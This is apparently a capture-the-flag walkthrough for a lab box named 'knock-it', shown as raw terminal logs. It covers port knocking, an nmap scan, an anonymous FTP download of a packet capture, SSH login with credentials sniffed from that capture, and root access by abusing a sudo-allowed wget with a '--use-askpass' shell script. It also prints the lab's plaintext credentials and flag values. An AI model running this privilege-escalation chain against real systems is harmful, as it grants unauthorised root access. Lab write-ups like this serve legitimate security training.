
brief `Use your knowledge of network packet analysis in order to get more intel about the hidden network infrastructure, detect misconfigurations, and most importantly, how you can make use of this intel to get access to systems and escalate your privileges.`

knockd port 21 

```bash 
─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $sudo nano /etc/hosts
[sudo] password for m1cr0: 
┌─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $knock -v 10.8.0.2 21
hitting tcp 10.8.0.2:21
┌─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $ftp 10.8.0.2 
ftp: Can't connect to `10.8.0.2:21': Connection refused
ftp: Can't connect to `10.8.0.2:ftp'
ftp> 
ftp> exit
┌─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $ftp 10.8.0.2 
ftp: Can't connect to `10.8.0.2:21': Connection refused
ftp: Can't connect to `10.8.0.2:ftp'
ftp> 
ftp> 
[3]+  Stopped                 ftp 10.8.0.2
┌─[✗]─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $knock -v 10.8.0.2 21 7000 8000 9000
hitting tcp 10.8.0.2:21
hitting tcp 10.8.0.2:7000
hitting tcp 10.8.0.2:8000
hitting tcp 10.8.0.2:9000
┌─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $sudo nmap -sCV -p- -min-rate 10000 10.8.0.2
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-15 20:35 BST
Warning: 10.8.0.2 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.8.0.2
Host is up (0.88s latency).
Not shown: 33704 filtered tcp ports (no-response), 31828 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.0.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            5930 Aug 28  2019 login.pcap
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8f32423afca7e6da66272eeec17309dc (RSA)
|   256 244585166fe64773fd676096079bd22a (ECDSA)
|_  256 849ba7e9c21fcde48c26bd34bffb20da (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.41 seconds
┌─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $ftp 10.8.0.2
Connected to 10.8.0.2.
220 (vsFTPd 3.0.3)
Name (10.8.0.2:m1cr0): 
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
ftp> 
[4]+  Stopped                 ftp 10.8.0.2
┌─[✗]─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $ftp 10.8.0.2
Connected to 10.8.0.2.
220 (vsFTPd 3.0.3)
Name (10.8.0.2:m1cr0): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||37079|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            5930 Aug 28  2019 login.pcap
226 Directory send OK.
ftp> get login.pcap
local: login.pcap remote: login.pcap
229 Entering Extended Passive Mode (|||25000|)
150 Opening BINARY mode data connection for login.pcap (5930 bytes).
100% |*****************************************************************************************************************************|  5930      435.38 KiB/s    00:00 ETA
226 Transfer complete.
5930 bytes received in 00:00 (23.78 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||51329|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        116          4096 Aug 28  2019 .
drwxr-xr-x    2 0        116          4096 Aug 28  2019 ..
-rw-r--r--    1 0        0            5930 Aug 28  2019 login.pcap
226 Directory send OK.
ftp> exit
221 Goodbye.
┌─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $


```

username=kabayla&password=K%40b%40ylA%21 

username = kabayla
passwd = K@b@ylA! 


```sql 
Knock-It-0xr1ck-15379.ovpn  login.pcap  scan.md
┌─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $ssh kabayla@10.8.0.2
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:TzRpdDISAGJjnO+hEullzhZSIfrlKK+9WvI+IJ3S2bc.
Please contact your system administrator.
Add correct host key in /home/m1cr0/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/m1cr0/.ssh/known_hosts:15
  remove with:
  ssh-keygen -f "/home/m1cr0/.ssh/known_hosts" -R "10.8.0.2"
ECDSA host key for 10.8.0.2 has changed and you have requested strict checking.
Host key verification failed.
┌─[✗]─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $sudo ssh-keygen -f "/home/m1cr0/.ssh/known_hosts" -R "10.8.0.2"
[sudo] password for m1cr0: 
# Host 10.8.0.2 found: line 15
/home/m1cr0/.ssh/known_hosts updated.
Original contents retained as /home/m1cr0/.ssh/known_hosts.old
┌─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $sudo ssh-keygen -f "/home/m1cr0/.ssh/known_hosts" -R "10.8.0.2"
Host 10.8.0.2 not found in /home/m1cr0/.ssh/known_hosts
┌─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/knock-it]
└──╼ $ssh kabayla@10.8.0.2
The authenticity of host '10.8.0.2 (10.8.0.2)' can't be established.
ECDSA key fingerprint is SHA256:TzRpdDISAGJjnO+hEullzhZSIfrlKK+9WvI+IJ3S2bc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/m1cr0/.ssh/known_hosts).
kabayla@10.8.0.2's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.0-1103-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Aug 15 19:42:17 UTC 2024

  System load:  0.0               Processes:           125
  Usage of /:   36.3% of 7.68GB   Users logged in:     0
  Memory usage: 21%               IP address for ens5: 172.16.4.130
  Swap usage:   0%                IP address for tun0: 10.8.0.2


103 packages can be updated.
1 update is a security update.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


$ ls
$ ls -la
total 32
drwxr-xr-x 4 kabayla kabayla 4096 May 31  2020 .
drwxr-xr-x 4 root    root    4096 Aug 15 15:15 ..
-rw------- 1 kabayla kabayla   11 May 31  2020 .bash_history
-rw-r--r-- 1 kabayla kabayla  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kabayla kabayla 3771 Apr  4  2018 .bashrc
drwx------ 2 kabayla kabayla 4096 May 31  2020 .cache
drwx------ 3 kabayla kabayla 4096 May 31  2020 .gnupg
-rw-r--r-- 1 kabayla kabayla  807 Apr  4  2018 .profile
$ cd /
$ /bin/bash -i 
kabayla@ip-172-16-4-130:/$ ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
kabayla@ip-172-16-4-130:/$ cd home/
kabayla@ip-172-16-4-130:/home$ ls
kabayla  local.txt  ubuntu
kabayla@ip-172-16-4-130:/home$ cat local.txt 
kit_double_group_15379-la4enw444muatnmy3t6ysvdw4kn3jg4d
kabayla@ip-172-16-4-130:/home$ sudo -l
Matching Defaults entries for kabayla on ip-172-16-4-130:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kabayla may run the following commands on ip-172-16-4-130:
    (root) NOPASSWD: /usr/bin/wget
kabayla@ip-172-16-4-130:/home$ TF=$(mktemp)
kabayla@ip-172-16-4-130:/home$ chmod +x $TF
kabayla@ip-172-16-4-130:/home$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
kabayla@ip-172-16-4-130:/home$ sudo wget --use-askpass=$TF 0
# ls
kabayla  local.txt  ubuntu
# cd root
/bin/sh: 2: cd: can't cd to root
# ls
kabayla  local.txt  ubuntu
# cd /root
# ls
proof.txt  snap  this_is_not_part_of_the_lab.ovpn
# cat proo	
cat: proo: No such file or directory
# cat proof.txt
kit_double_group_15379-vxfn9gov7rthimo16mzelrro776hl4nx
# 
```

